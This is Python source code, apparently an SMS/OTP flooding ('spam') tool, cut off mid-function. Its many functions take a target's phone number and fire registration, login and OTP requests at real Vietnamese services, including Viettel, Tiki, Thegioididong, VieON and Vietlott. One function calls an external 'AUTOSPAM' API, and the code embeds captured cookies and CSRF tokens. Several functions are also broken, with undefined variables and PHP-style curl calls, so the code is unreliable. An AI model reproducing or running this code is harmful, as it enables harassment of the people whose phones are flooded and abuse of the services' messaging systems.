    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)        
    
def tiki(phone):
    response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=ua, json=jsdt).text  

def apiv5(phone):
    url = "https://api.huykaiser.me/API/AUTOSPAM/spam?count=100&phone={}".format(phone)
    requests.post(url)

def moca(phone):
    home = requests.get('https://moca.vn/moca/v2/users/role', params=paramss, headers=headerss).json()
    token = home['data']['registrationId']
    response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headerss).json()
    
def gbay(phone):
    json_data = {'phone_number': phone,'hash': random_string(40),}
    requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()
 
def tgdd(phone):
    cookies = {
        'DMX_Personal': '%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE',
        '_gid': 'GA1.2.2106570071.1685151972',
        '_ga_TLRZMSX5ME': 'GS1.1.1685151972.1.0.1685151972.60.0.0',
        '_ga': 'GA1.1.2004811826.1685151972',
        '_fbp': 'fb.1.1685151972814.1550382232',
        'cebs': '1',
        '_ce.s': 'v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940',
        '_ce.clock_event': '1',
        'SvID': 'beline2686|ZHFg6|ZHFg5',
        '_ce.clock_data': '-113%2C14.225.211.123%2C1',
        'cebsp_': '1',
        '_tt_enable_cookie': '1',
        '_ttp': '5MoF_IoMgcKATLRi4lIvjOVPQrd',
        'lhc_per': 'vid|eadd7b088636140f774e',
    }

    headers = {
        'authority': 'www.thegioididong.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'DMX_Personal=%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE; _gid=GA1.2.2106570071.1685151972; _ga_TLRZMSX5ME=GS1.1.1685151972.1.0.1685151972.60.0.0; _ga=GA1.1.2004811826.1685151972; _fbp=fb.1.1685151972814.1550382232; cebs=1; _ce.s=v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940; _ce.clock_event=1; SvID=beline2686|ZHFg6|ZHFg5; _ce.clock_data=-113%2C14.225.211.123%2C1; cebsp_=1; _tt_enable_cookie=1; _ttp=5MoF_IoMgcKATLRi4lIvjOVPQrd; lhc_per=vid|eadd7b088636140f774e',
        'origin': 'https://www.thegioididong.com',
        'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8OWsBjKS6DlGsrtmU_sYztIFV_sLQ8iWp7L2ZHjo3-UAquJc6mF7IflJ21rflzBVCTfkVYuNcBYuDIdaZroeLkecOCkjg8RcsK0QvNDv6_w7iP7JTCGaGgWZ4Ybwep7Zt6N6vP8-qJcVUHhSPvjvh_s',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )

def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)    

def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)

def BIBABO(sdt):
    headers = {
        "Host": "bibabo.vn",
        "Connection": "keep-alive",
        "Content-Length": "64",
        "Accept": "/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "Origin": "https://bibabo.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "uibi=eyJpdiI6IlQyam9wWko1MGRQVXNTMnZOZEZpWGc9PSIsInZhbHVlIjoiYjV5SlR1V0tVbjdFNFwvK2FBUzIwbWZWT0YzOUdvR2cyQzZKQXI5OHFKOHM9IiwibWFjIjoiZmFiZWVkOTA0ZmE3NjJkZTRhMzI4MGQ0OWQxMTBjMmZmZjQ2ZTc0ZGYxODhlMmFiNTMwMzVlZjc0Y2MyMTg2NCJ9; ga=GA1.2.55963624.1683002314; gid=GA1.2.593754343.1683002314; mp376a95ebc99b460db45b090a5936c5demixpanel=%7B%22distinctid%22%3A%20%22%24device%3A187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24deviceid%22%3A%20%22187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24initialreferrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2Fhome%22%2C%22%24initialreferringdomain%22%3A%20%22bibabo.vn%22%7D; gat=1; gaVisitorUuid=47008ca1-32a0-4daa-9694-e36807c4dd91; fbp=fb.1.1683002315008.1108739564; XSRF-TOKEN=eyJpdiI6InNtOGtVeHBSZmVoQjR0N1wvRW1hckF3PT0iLCJ2YWx1ZSI6IlNLQ0p3UFlUZGhjdENKSFM1cHdLeXJGcFVGaE1EaDNKa0VRNk40cWo1enFCTERSTVowaEczSzc0WitTNks4am9VcE40KzAzVCtwbUVkeGVZUE1mcER3PT0iLCJtYWMiOiIzYzAxZGZmNzMxOWM3NWExOTY1MmFmYjNkMzhiOGM4OGNhMDQxNmRhZDA4YTY2ZmZhOTNjY2RhN2FiZjZlOTVmIn0%3D; laravelsession=eyJpdiI6Ind5blczNnFrMzRWbTJEbDRVcGNRaXc9PSIsInZhbHVlIjoiZXQyQUJoS3NuTXd4RUljMEhLQUZkS0Q0MEdSdGUrb09PdURXSm03d2xOS2pDRThjbERCUzlyeEpTR3VHTVUxOXd0UTVOVnppXC92WVFyOTZKS240KzBnPT0iLCJtYWMiOiJjMWQ5MWQ5YjdjYTZlODc5MjI2YmNjZTM5YjZlMWVmMThiYmRlMTIzYTI1M2E1YmIzZDc5MDExNGJlODRhYjUwIn0%3D"
    }
    payload = {
        "phone": sdt,
        "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"
    }

    response = requests.post("https://bibabo.vn/user/verify-phone", headers=headers, data=payload)

def SWIFT247(sdt):
    url = "https://api.swift247.vn/v1/checkphone"
    headers = {
        "Host": "api.swift247.vn",
        "content-length": "23",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://app.swift247.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.swift247.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    response = requests.post(url, headers=headers, json=postdata)         

def KILO(sdt):
    headers = {
        "Host": "api.kilo.vn",
        "content-length": "54",
        "app-version": "1",
        "x-correlation-id": "d5afa9c6-73cb-47bf-ad42-0672912b725b",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json",
        "i18next-language": "vi",
        "api-version": "2",
        "platform": "SELLER_WEB",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://seller.kilo.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://seller.kilo.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    email = random.choice(['a', 'b', 'c', 'd', 'e', 'f']) + "@gmail.com"  # Email đăng ký tài khoản
    data = json.dumps({"phone": sdt, "email": email})
    response = requests.post("https://api.kilo.vn/users/check-new-user", headers=headers, data=data)

def GAPO(sdt):
    Headers = [
        "Host: api.gapo.vn",
        "Content-Length: 31",
        "Content-Type: application/json",
        "Sec-Ch-Ua-Mobile: ?1",
        "Authorization: Bearer",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform: \"Android\"",
        "Accept: */*",
        "Origin: https://www.gapo.vn",
        "Sec-Fetch-Site: same-site",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://www.gapo.vn/",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    ]
    Data = {
        "device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2",
        "phone_number": "+84-" + sdt[1:11],
        "otp_type": 0
    }
    Options = {
        "http": {
            "header": "\r\n".join(Headers),
            "method": "POST",
            "content": json.dumps(Data),
            "ignore_errors": True
        }
    }
    Context = ssl._create_unverified_context()
    Result = urllib.request.urlopen("https://api.gapo.vn/auth/v2.0/signup", data=json.dumps(Data).encode('utf-8'), context=Context)

def PHUCLONG(sdt):
    headers = {
        "Host": "api-crownx.winmart.vn",
        "content-length": "126",
        "accept": "application/json",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": '"Android"',
        "origin": "https://order.phuclong.com.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://order.phuclong.com.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
  
    data = {
        "phoneNumber": sdt,
        "fullName": "Nguyễn Đặng Hoàng Hải",
        "email": "vexnolove03@gmail.com",
        "password": "Vrxx#1337"
    }
    datason = json.dumps(data)
    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', data=datason, headers=headers)

def VIETLOTT(sdt):
    headers = {
        "Host": "api-mobi.vietlottsms.vn",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "ClientCallAPI": "EMB",
        "deviceId": "",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "/",
        "partnerChannel": "WEB",
        "Identify-Device-Token": "",
        "checkSum": "887e5218c679e1fe26b48cc642532a39909f619868f09d415b7d13cd43784f36",
        "sec-ch-ua-platform": "Android",
        "Origin": "https://vietlott-sms.vn",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://vietlott-sms.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    data = {'phoneNumber': sdt}
    datason = json.dumps(data)
    
    url = 'https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber'
    
    response = requests.post(url, data=datason, headers=headers)

def CONCUNG(sdt):
  headers = {
    "Host": "concung.com",
    "content-length": "121",
    "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
    "accept": "/",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Linux x8664; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://concung.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://concung.com/dang-nhap.html",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
    "cookie": "gaBBD6001M29=GS1.1.1679234342.1.1.1679234352.50.0.0"
  }
  postData = {
    "ajax": "1",
    "classAjax": "AjaxLogin",
    "methodAjax": "sendOtpLogin",
    "customerphone": sdt,
    "idcustomer": "0",
    "momoapp": "0",
    "back": "khach-hang.html"
  }
  ch = curlinit()
  curlsetopt(ch, CURLOPTURL, "https://concung.com/ajax.html")
  curlsetopt(ch, CURLOPTRETURNTRANSFER, 1)
  curlsetopt(ch, CURLOPTHEADER, 1)
  curlsetopt(ch, CURLINFOHEADEROUT, true)
  curlsetopt(ch, CURLOPTPOST, 1)
  curlsetopt(ch, CURLOPTPOSTFIELDS, postData)
  curlsetopt(ch, CURLOPTHTTPHEADER, headers)
  response = curlexec(ch)
  info = curlgetinfo(ch)
  curlclose(ch)

def GOTADI(sdt):
  headers = {
    "Host": "api.gotadi.com",
    "content-length": "44",
    "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
    "accept": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
    "gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Linux x8664; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "content-type": "application/json",
    "origin": "https://www.gotadi.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://www.gotadi.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
  }
  
  postData = {
    "phoneNumber": sdt,
    "language": "VI"
  }
  
  data = json.dumps(postData)
  
  response = requests.post("https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=data, headers=headers)

def VIETID(sdt):
    # perform a GET request to the login page to retrieve the csrf token
    url = 'https://oauth.vietid.net/rb/login?next=https%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F'
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "Accept-Encoding": "gzip, deflate, br"
    }
    csrfget_response = requests.get(url, headers=headers)
    
    if csrfget_response.status_code == 200:
        # extract the csrf token from the response
        csrf = csrfget_response.text.split('name="csrf-token" value="')[1].split('"')[0]

        # post the phone number and the csrf token to the login page to actually log in
        url = 'https://oauth.vietid.net/rb/login'
        payload = {'authenticity_token': csrf, 'phone': sdt }
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Referer": "https://oauth.vietid.net/rb/login",
            "Accept-Encoding": "gzip, deflate, br"
        }
        response = requests.post(url, data=payload, headers=headers)
        status_code = response.status_code

def VAMO(sdt):
    headers = [
